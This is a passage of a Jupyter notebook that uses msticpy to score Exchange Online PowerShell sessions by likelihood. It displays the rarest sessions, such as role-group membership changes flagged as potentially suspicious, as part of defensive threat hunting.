VmnPYYQ/JIh3wWLghT/Pxus4F+h6P1tVU72T0no//RLKaSpthD++aFZpz2GEP8ZeSECog4Q/iI8J8UNthD/Nxus4F+h6P7ZdHxakmoQ/lEw2+4X6cj9DFyDa84OEP0MXINrzg4Q//RLKaSpthD8FVC1OYVaEPwsG2UjqtHo/Qxcg2vODhD/I8KDGxRR7P6NojKlndXE/vmhWac9hhD8kiHfBYuCFP7QEiDLwpXo/wozM9byahD+IjwnxQ22EPySId8Fi4IU/vmhWac9hhD+IjwnxQ22EP4iPCfFDbYQ/JIh3wWLghT/I8KDGxRR7P0MXINrzg4Q/Qxcg2vODhD8kiHfBYuCFP4iPCfFDbYQ/z8brOBfoej/Pxus4F+h6PwsG2UjqtHo/t10fFqSahD8LXGWZcniEP83G6zgX6Ho/j/evYwWmhD+IjwnxQ22EP75oVmnPYYQ/vmhWac9hhD8kiHfBYuCFP9eaSlOleIQ/jvevYwWmhD8kiHfBYuCFP7ZdHxakmoQ/xl5IQKiDhD++aFZpz2GEP0MXINrzg4Q/o2iMqWd1cT/Nxus4F+h6PwsG2UjqtHo/yPCgxsUUez/Nxus4F+h6P0MXINrzg4Q/JIh3wWLghT/XmkpTpXiEP9eaSlOleIQ/z8brOBfoej/4KrRvANl6P63v2VbLw3o/iI8J8UNthD+IjwnxQ22EP9eaSlOleIQ/+Cq0bwDZej/XmkpTpXiEP4iPCfFDbYQ/iI8J8UNthD/9EsppKm2EP0MXINrzg4Q/iI8J8UNthD/Pxus4F+h6P8jwoMbFFHs/15pKU6V4hD9mFBl9kFHFPg==\",\"dtype\":\"float64\",\"order\":\"little\",\"shape\":[146]},\"time_col\":[\"2020-06-21 02:36:46+00:00\",\"2020-06-21 05:31:34+00:00\",\"2020-06-22 02:27:06+00:00\",\"2020-06-22 02:30:52+00:00\",\"2020-06-22 04:55:59+00:00\",\"2020-06-23 02:31:32+00:00\",\"2020-06-23 05:35:26+00:00\",\"2020-06-24 02:00:55+00:00\",\"2020-06-24 02:06:55+00:00\",\"2020-06-24 05:21:02+00:00\",\"2020-06-25 02:15:42+00:00\",\"2020-06-26 03:41:02+00:00\",\"2020-06-26 06:56:14+00:00\",\"2020-06-27 02:36:03+00:00\",\"2020-06-27 02:40:59+00:00\",\"2020-06-27 05:10:41+00:00\",\"2020-06-28 02:25:45+00:00\",\"2020-06-28 05:25:42+00:00\",\"2020-06-28 05:30:53+00:00\",\"2020-06-29 02:01:49+00:00\",\"2020-06-29 04:50:44+00:00\",\"2020-06-29 04:56:13+00:00\",\"2020-06-30 02:11:11+00:00\",\"2020-06-30 02:16:20+00:00\",\"2020-06-30 05:15:37+00:00\",\"2020-07-01 01:56:06+00:00\",\"2020-07-01 05:20:57+00:00\",\"2020-07-02 02:16:17+00:00\",\"2020-07-02 05:01:42+00:00\",\"2020-07-03 02:38:45+00:00\",\"2020-07-03 05:38:39+00:00\",\"2020-07-04 02:10:37+00:00\",\"2020-07-04 05:06:39+00:00\",\"2020-07-05 02:15:59+00:00\",\"2020-07-05 05:15:54+00:00\",\"2020-07-06 01:51:03+00:00\",\"2020-07-06 04:41:38+00:00\",\"2020-07-07 02:01:28+00:00\",\"2020-07-08 02:40:54+00:00\",\"2020-07-08 05:06:16+00:00\",\"2020-07-09 02:45:55+00:00\",\"2020-07-10 02:55:37+00:00\",\"2020-07-10 05:41:11+00:00\",\"2020-07-11 02:31:00+00:00\",\"2020-07-11 05:11:24+00:00\",\"2020-07-11 05:15:56+00:00\",\"2020-07-12 02:56:23+00:00\",\"2020-07-12 05:40:46+00:00\",\"2020-07-13 03:13:51+00:00\",\"2020-07-13 05:46:02+00:00\",\"2020-07-13 05:51:32+00:00\",\"2020-07-14 03:15:14+00:00\",\"2020-07-14 05:36:52+00:00\",\"2020-07-15 03:00:52+00:00\",\"2020-07-15 05:36:56+00:00\",\"2020-07-16 02:40:40+00:00\",\"2020-07-16 05:06:29+00:00\",\"2020-07-16 05:14:07+00:00\",\"2020-07-17 02:07:43+00:00\",\"2020-07-17 05:06:25+00:00\",\"2020-07-17 05:10:59+00:00\",\"2020-07-18 05:31:05+00:00\",\"2020-07-19 05:46:03+00:00\",\"2020-07-20 02:30:58+00:00\",\"2020-07-20 06:16:41+00:00\",\"2020-07-21 02:16:20+00:00\",\"2020-07-21 05:06:31+00:00\",\"2020-07-22 02:20:45+00:00\",\"2020-07-22 05:21:38+00:00\",\"2020-07-23 02:26:13+00:00\",\"2020-07-23 02:30:51+00:00\",\"2020-07-23 04:30:50+00:00\",\"2020-07-23 05:31:27+00:00\",\"2020-07-24 02:41:29+00:00\",\"2020-07-24 05:05:49+00:00\",\"2020-07-25 02:30:48+00:00\",\"2020-07-25 05:46:32+00:00\",\"2020-07-26 02:41:28+00:00\",\"2020-07-26 02:47:29+00:00\",\"2020-07-26 05:29:37+00:00\",\"2020-07-27 02:16:05+00:00\",\"2020-07-27 05:21:25+00:00\",\"2020-07-28 02:11:05+00:00\",\"2020-07-28 05:31:49+00:00\",\"2020-07-28 05:35:59+00:00\",\"2020-07-28 05:40:57+00:00\",\"2020-07-29 01:51:42+00:00\",\"2020-07-29 02:46:29+00:00\",\"2020-07-29 05:24:14+00:00\",\"2020-07-29 05:26:49+00:00\",\"2020-07-30 02:25:55+00:00\",\"2020-07-30 05:21:00+00:00\",\"2020-07-31 02:45:46+00:00\",\"2020-07-31 02:50:49+00:00\",\"2020-07-31 05:05:42+00:00\",\"2020-08-01 02:35:39+00:00\",\"2020-08-01 05:36:25+00:00\",\"2020-08-01 05:41:31+00:00\",\"2020-08-02 02:21:03+00:00\",\"2020-08-02 05:36:35+00:00\",\"2020-08-03 02:16:00+00:00\",\"2020-08-03 02:21:26+00:00\",\"2020-08-03 05:26:28+00:00\",\"2020-08-04 01:56:07+00:00\",\"2020-08-04 05:46:29+00:00\",\"2020-08-05 02:31:32+00:00\",\"2020-08-05 05:25:34+00:00\",\"2020-08-05 05:51:25+00:00\",\"2020-08-05 08:20:38+00:00\",\"2020-08-05 16:50:31+00:00\",\"2020-08-06 02:25:53+00:00\",\"2020-08-06 05:26:17+00:00\",\"2020-08-06 06:55:49+00:00\",\"2020-08-06 08:16:06+00:00\",\"2020-08-06 20:16:01+00:00\",\"2020-08-06 20:51:13+00:00\",\"2020-08-06 23:11:04+00:00\",\"2020-08-07 03:11:34+00:00\",\"2020-08-07 03:26:13+00:00\",\"2020-08-07 05:41:05+00:00\",\"2020-08-08 02:15:55+00:00\",\"2020-08-08 05:16:44+00:00\",\"2020-08-08 09:36:37+00:00\",\"2020-08-09 01:56:24+00:00\",\"2020-08-09 05:15:38+00:00\",\"2020-08-10 02:36:00+00:00\",\"2020-08-10 05:25:57+00:00\",\"2020-08-10 05:30:33+00:00\",\"2020-08-11 03:04:21+00:00\",\"2020-08-11 05:19:46+00:00\",\"2020-08-12 01:56:17+00:00\",\"2020-08-12 05:36:26+00:00\",\"2020-08-13 02:56:44+00:00\",\"2020-08-13 05:35:54+00:00\",\"2020-08-14 02:32:07+00:00\",\"2020-08-14 05:51:15+00:00\",\"2020-08-16 02:06:26+00:00\",\"2020-08-16 05:11:57+00:00\",\"2020-08-17 02:05:52+00:00\",\"2020-08-17 05:20:45+00:00\",\"2020-08-18 02:32:00+00:00\",\"2020-08-18 02:35:50+00:00\",\"2020-08-18 05:26:24+00:00\",\"2020-08-19 02:36:20+00:00\",\"2020-08-19 06:06:00+00:00\",\"2020-07-29 20:11:27+00:00\"],\"y_index\":[1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]},\"selected\":{\"id\":\"1491\"},\"selection_policy\":{\"id\":\"1490\"}},\"id\":\"1431\",\"type\":\"ColumnDataSource\"},{\"attributes\":{},\"id\":\"1505\",\"type\":\"UnionRenderers\"},{\"attributes\":{\"axis_label\":\"rarest_window3_likelihood\",\"formatter\":{\"id\":\"1473\"},\"major_label_policy\":{\"id\":\"1474\"},\"ticker\":{\"id\":\"1413\"}},\"id\":\"1412\",\"type\":\"LinearAxis\"},{\"attributes\":{},\"id\":\"1506\",\"type\":\"Selection\"},{\"attributes\":{},\"id\":\"1404\",\"type\":\"LinearScale\"},{\"attributes\":{\"dimensions\":\"width\"},\"id\":\"1416\",\"type\":\"WheelZoomTool\"},{\"attributes\":{\"axis_label\":\"Event Time\",\"formatter\":{\"id\":\"1429\"},\"major_label_policy\":{\"id\":\"1471\"},\"ticker\":{\"id\":\"1409\"}},\"id\":\"1408\",\"type\":\"DatetimeAxis\"},{\"attributes\":{},\"id\":\"1406\",\"type\":\"LinearScale\"},{\"attributes\":{\"axis\":{\"id\":\"1408\"},\"grid_line_alpha\":0.3,\"grid_line_color\":\"navy\",\"minor_grid_line_alpha\":0.1,\"minor_grid_line_color\":\"navy\",\"ticker\":null},\"id\":\"1411\",\"type\":\"Grid\"},{\"attributes\":{\"num_minor_ticks\":10,\"tickers\":[{\"id\":\"1477\"},{\"id\":\"1478\"},{\"id\":\"1479\"},{\"id\":\"1480\"},{\"id\":\"1481\"},{\"id\":\"1482\"},{\"id\":\"1483\"},{\"id\":\"1484\"},{\"id\":\"1485\"},{\"id\":\"1486\"},{\"id\":\"1487\"},{\"id\":\"1488\"}]},\"id\":\"1409\",\"type\":\"DatetimeTicker\"},{\"attributes\":{\"axis\":{\"id\":\"1412\"},\"dimension\":1,\"grid_line_alpha\":0.3,\"grid_line_color\":\"navy\",\"minor_grid_line_alpha\":0.1,\"minor_grid_line_color\":\"navy\",\"ticker\":null},\"id\":\"1415\",\"type\":\"Grid\"},{\"attributes\":{},\"id\":\"1413\",\"type\":\"BasicTicker\"}],\"root_ids\":[\"1467\"]},\"title\":\"Bokeh Application\",\"version\":\"2.3.0\"}};\n",
       "  var render_items = [{\"docid\":\"cb6737e3-248a-45c9-aad1-4a03cb051470\",\"root_ids\":[\"1467\"],\"roots\":{\"1467\":\"cfa2deee-deba-4e70-9ee2-c878533bef28\"}}];\n",
       "  root.Bokeh.embed.embed_items_notebook(docs_json, render_items);\n",
       "\n",
       "  }\n",
       "  if (root.Bokeh !== undefined) {\n",
       "    embed_document(root);\n",
       "  } else {\n",
       "    var attempts = 0;\n",
       "    var timer = setInterval(function(root) {\n",
       "      if (root.Bokeh !== undefined) {\n",
       "        clearInterval(timer);\n",
       "        embed_document(root);\n",
       "      } else {\n",
       "        attempts++;\n",
       "        if (attempts > 100) {\n",
       "          clearInterval(timer);\n",
       "          console.log(\"Bokeh: ERROR: Unable to run BokehJS code because BokehJS library is missing\");\n",
       "        }\n",
       "      }\n",
       "    }, 10, root)\n",
       "  }\n",
       "})(window);"
      ],
      "application/vnd.bokehjs_exec.v0+json": ""
     },
     "metadata": {
      "application/vnd.bokehjs_exec.v0+json": {
       "id": "1467"
      }
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "from msticpy.analysis.anomalous_sequence.utils.data_structures import Cmd\n",
    "from msticpy.analysis.anomalous_sequence import anomalous\n",
    "\n",
    "def process_exchange_session(session_with_params, include_vals):\n",
    "    new_ses = []\n",
    "    for cmd in session_with_params:\n",
    "        c = list(cmd.keys())[0]\n",
    "        par = list(cmd.values())[0]\n",
    "        new_pars = set()\n",
    "        if include_vals:\n",
    "            new_pars = dict()\n",
    "        for p in par:\n",
    "            if include_vals:\n",
    "                new_pars[p['Name']] = p['Value']\n",
    "            else:\n",
    "                new_pars.add(p['Name'])\n",
    "        new_ses.append(Cmd(name=c, params=new_pars))\n",
    "    return new_ses\n",
    "\n",
    "sessions = exchange_df.cmds.values.tolist()\n",
    "param_sessions = []\n",
    "param_value_sessions = []\n",
    "\n",
    "for ses in exchange_df.params.values.tolist():\n",
    "    new_ses_set = process_exchange_session(session_with_params=ses, include_vals=False)\n",
    "    new_ses_dict = process_exchange_session(session_with_params=ses, include_vals=True)\n",
    "    param_sessions.append(new_ses_set)\n",
    "    param_value_sessions.append(new_ses_dict)\n",
    "\n",
    "data = exchange_df\n",
    "data['session'] = sessions\n",
    "data['param_session'] = param_sessions\n",
    "data['param_value_session'] = param_value_sessions\n",
    "\n",
    "modelled_df = anomalous.score_sessions(\n",
    "    data=data,\n",
    "    session_column='param_value_session',\n",
    "    window_length=3\n",
    ")\n",
    "\n",
    "anomalous.visualise_scored_sessions(\n",
    "    data_with_scores=modelled_df,\n",
    "    time_column='begin',  # this will appear on the x-axis\n",
    "    score_column='rarest_window3_likelihood',  # this will appear on the y axis\n",
    "    window_column='rarest_window3',  # this will represent the session in the tool-tips\n",
    "    source_columns=['UserId', 'ClientIP'],  # specify any additional columns to appear in the tool-tips\n",
    ")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The events are shown in descending order of likelihood (vertically), so the<br>\n",
    "events at the bottom of the chart are the ones most interesting to us.\n",
    "\n",
    "**Looking at these rare events, we can see potentially suspicious activity changing role memberships.**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {
    "gather": {
     "logged": 1617841520179
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<p style='font-weight: bold'>Move the slider to see event sessions below the selected <i>likelihood</i> threshold</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<hr>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ab32e86cf72046ccb33ebb25e6ee971b",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "FloatSlider(value=0.000536508714208626, description='Select likelihood threshold', layout=Layout(width='60%'),…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<hr>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>Range is 0.0000025 (min likelihood) to 0.0106819 (max likelihood)<br><br><hr></p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>UserId</th>\n",
       "      <th>ClientIP</th>\n",
       "      <th>nCmds</th>\n",
       "      <th>nDistinctCmds</th>\n",
       "      <th>begin</th>\n",
       "      <th>end</th>\n",
       "      <th>duration</th>\n",
       "      <th>cmds</th>\n",
       "      <th>params</th>\n",
       "      <th>session</th>\n",
       "      <th>param_session</th>\n",
       "      <th>param_value_session</th>\n",
       "      <th>rarest_window3_likelihood</th>\n",
       "      <th>rarest_window3</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>18</th>\n",
       "      <td>NAMPRD06\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)</td>\n",
       "      <td>nan</td>\n",
       "      <td>10</td>\n",
       "      <td>1</td>\n",
       "      <td>2020-06-28 05:30:53+00:00</td>\n",
       "      <td>2020-06-28 05:30:53+00:00</td>\n",
       "      <td>0 days</td>\n",
       "      <td>[Set-ConditionalAccessPolicy, Set-ConditionalAccessPolicy, Set-ConditionalAccessPolicy, Set-Cond...</td>\n",
       "      <td>[{'Set-ConditionalAccessPolicy': [{'Name': 'Identity', 'Value': 'seccxpninja.onmicrosoft.com\\\\23...</td>\n",
       "      <td>[Set-ConditionalAccessPolicy, Set-ConditionalAccessPolicy, Set-ConditionalAccessPolicy, Set-Cond...</td>\n",
       "      <td>[Cmd(name='Set-ConditionalAccessPolicy', params={'Identity', 'TenantDefaultPolicy', 'PolicyLastU...</td>\n",
       "      <td>[Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\235be...</td>\n",
       "      <td>0.003386</td>\n",
       "      <td>[Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\6490d...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>145</th>\n",
       "      <td>timvic@contoso.onmicrosoft.com</td>\n",
       "      <td>20.185.182.48:37965</td>\n",
       "      <td>6</td>\n",
       "      <td>1</td>\n",
       "      <td>2020-07-29 20:11:27+00:00</td>\n",
       "      <td>2020-07-29 20:11:27+00:00</td>\n",
       "      <td>0 days</td>\n",
       "      <td>[Update-RoleGroupMember, Update-RoleGroupMember, Update-RoleGroupMember, Update-RoleGroupMember,...</td>\n",
       "      <td>[{'Update-RoleGroupMember': [{'Name': 'Members', 'Value': 'CBoehmSA;pcadmin;SecurityAdmins_20075...</td>\n",
       "      <td>[Update-RoleGroupMember, Update-RoleGroupMember, Update-RoleGroupMember, Update-RoleGroupMember,...</td>\n",
       "      <td>[Cmd(name='Update-RoleGroupMember', params={'Members', 'Identity'}), Cmd(name='Update-RoleGroupM...</td>\n",
       "      <td>[Cmd(name='Update-RoleGroupMember', params={'Members': 'CBoehmSA;pcadmin;SecurityAdmins_20075581...</td>\n",
       "      <td>0.000003</td>\n",
       "      <td>[Cmd(name='Update-RoleGroupMember', params={'Members': 'CBoehmSA;ComplianceAdmins_939735849', 'I...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                                          UserId  \\\n",
       "18   NAMPRD06\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)   \n",
       "145                                               timvic@contoso.onmicrosoft.com   \n",
       "\n",
       "                ClientIP  nCmds  nDistinctCmds                     begin  \\\n",
       "18                   nan     10              1 2020-06-28 05:30:53+00:00   \n",
       "145  20.185.182.48:37965      6              1 2020-07-29 20:11:27+00:00   \n",
       "\n",
       "                          end duration  \\\n",
       "18  2020-06-28 05:30:53+00:00   0 days   \n",
       "145 2020-07-29 20:11:27+00:00   0 days   \n",
       "\n",
       "                                                                                                    cmds  \\\n",
       "18   [Set-ConditionalAccessPolicy, Set-ConditionalAccessPolicy, Set-ConditionalAccessPolicy, Set-Cond...   \n",
       "145  [Update-RoleGroupMember, Update-RoleGroupMember, Update-RoleGroupMember, Update-RoleGroupMember,...   \n",
       "\n",
       "                                                                                                  params  \\\n",
       "18   [{'Set-ConditionalAccessPolicy': [{'Name': 'Identity', 'Value': 'seccxpninja.onmicrosoft.com\\\\23...   \n",
       "145  [{'Update-RoleGroupMember': [{'Name': 'Members', 'Value': 'CBoehmSA;pcadmin;SecurityAdmins_20075...   \n",
       "\n",
       "                                                                                                 session  \\\n",
       "18   [Set-ConditionalAccessPolicy, Set-ConditionalAccessPolicy, Set-ConditionalAccessPolicy, Set-Cond...   \n",
       "145  [Update-RoleGroupMember, Update-RoleGroupMember, Update-RoleGroupMember, Update-RoleGroupMember,...   \n",
       "\n",
       "                                                                                           param_session  \\\n",
       "18   [Cmd(name='Set-ConditionalAccessPolicy', params={'Identity', 'TenantDefaultPolicy', 'PolicyLastU...   \n",
       "145  [Cmd(name='Update-RoleGroupMember', params={'Members', 'Identity'}), Cmd(name='Update-RoleGroupM...   \n",
       "\n",
       "                                                                                     param_value_session  \\\n",
       "18   [Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\235be...   \n",
       "145  [Cmd(name='Update-RoleGroupMember', params={'Members': 'CBoehmSA;pcadmin;SecurityAdmins_20075581...   \n",
       "\n",
       "     rarest_window3_likelihood  \\\n",
       "18                    0.003386   \n",
       "145                   0.000003   \n",
       "\n",
       "                                                                                          rarest_window3  \n",
       "18   [Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\6490d...  \n",
       "145  [Cmd(name='Update-RoleGroupMember', params={'Members': 'CBoehmSA;ComplianceAdmins_939735849', 'I...  "
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "pd.set_option(\"display.html.table_schema\", False)\n",
    "\n",
    "likelihood_max=modelled_df[\"rarest_window3_likelihood\"].max()\n",
    "likelihood_min=modelled_df[\"rarest_window3_likelihood\"].min()\n",
    "slider_step = (likelihood_max - likelihood_min) / 20\n",
    "start_val = likelihood_min + slider_step\n",
    "threshold = widgets.FloatSlider(\n",
    "    description=\"Select likelihood threshold\",\n",
    "    max=likelihood_max,\n",
    "    min=likelihood_min,\n",
    "    value=start_val,\n",
    "    step=start_val,\n",
    "    layout=widgets.Layout(width=\"60%\"),\n",
    "    style={\"description_width\": \"200px\"},\n",
    "    readout_format=\".7f\"\n",
    ")\n",
    "\n",
    "\n",
    "def show_rows(change):\n",
    "    thresh = change[\"new\"]\n",
    "    pd_disp.update(modelled_df[modelled_df[\"rarest_window3_likelihood\"] < thresh])\n",
    "\n",
    "threshold.observe(show_rows, names=\"value\")\n",
    "md(\"Move the slider to see event sessions below the selected <i>likelihood</i> threshold\", \"bold\")\n",
    "display(HTML(\"<hr>\"))\n",
    "display(threshold)\n",
    "display(HTML(\"<hr>\"))\n",
    "md(f\"Range is {likelihood_min:.7f} (min likelihood) to {likelihood_max:.7f} (max likelihood)<br><br><hr>\")\n",
    "pd_disp = display(\n",
    "    modelled_df[modelled_df[\"rarest_window3_likelihood\"] < start_val],\n",
    "    display_id=True\n",
    ")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Print out content of the selected events/commands in more readable format\n",
    "\n",
    "> Note for many events the output will be long"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {
    "gather": {
     "logged": 1617841645541
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<p style='font-size: 130%'>Event 1</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>145</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>UserId</th>\n",
       "      <td>timvic@contoso.onmicrosoft.com</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>ClientIP</th>\n",
       "      <td>20.185.182.48:37965</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>begin</th>\n",
       "      <td>2020-07-29 20:11:27+00:00</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>end</th>\n",
       "      <td>2020-07-29 20:11:27+00:00</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>likelihood</th>\n",
       "      <td>2.54138e-06</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                       145\n",
       "UserId      timvic@contoso.onmicrosoft.com\n",
       "ClientIP               20.185.182.48:37965\n",
       "begin            2020-07-29 20:11:27+00:00\n",
       "end              2020-07-29 20:11:27+00:00\n",
       "likelihood                     2.54138e-06"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''><hr></p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style='font-weight: bold'>Param session details:</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>Command: Update-RoleGroupMember</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>{'Identity': 'Security Administrator',\n",
       " 'Members': 'CBoehmSA;pcadmin;SecurityAdmins_2007558133'}</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>Command: Update-RoleGroupMember</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>{'Identity': 'Compliance Management',\n",
       " 'Members': 'CBoehmSA;ComplianceAdmins_939735849'}</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>Command: Update-RoleGroupMember</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>{'Identity': 'Discovery Management', 'Members': 'CBoehmSA'}</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>Command: Update-RoleGroupMember</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>{'Identity': 'Compliance Management',\n",
       " 'Members': 'CBoehmSA;ComplianceAdmins_939735849'}</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>Command: Update-RoleGroupMember</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>{'Identity': 'Discovery Management', 'Members': 'CBoehmSA'}</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>Command: Update-RoleGroupMember</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>{'Identity': 'Security Administrator',\n",
       " 'Members': 'CBoehmSA;pcadmin;SecurityAdmins_2007558133'}</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''><hr><br></p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style='font-size: 130%'>Event 2</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>18</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>UserId</th>\n",
       "      <td>NAMPRD06\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>ClientIP</th>\n",
       "      <td>nan</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>begin</th>\n",
       "      <td>2020-06-28 05:30:53+00:00</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>end</th>\n",
       "      <td>2020-06-28 05:30:53+00:00</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>likelihood</th>\n",
       "      <td>0.00338604</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                                                     18\n",
       "UserId      NAMPRD06\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\n",
       "ClientIP                                                                            nan\n",
       "begin                                                         2020-06-28 05:30:53+00:00\n",
       "end                                                           2020-06-28 05:30:53+00:00\n",
       "likelihood                                                                   0.00338604"
      ]
     },
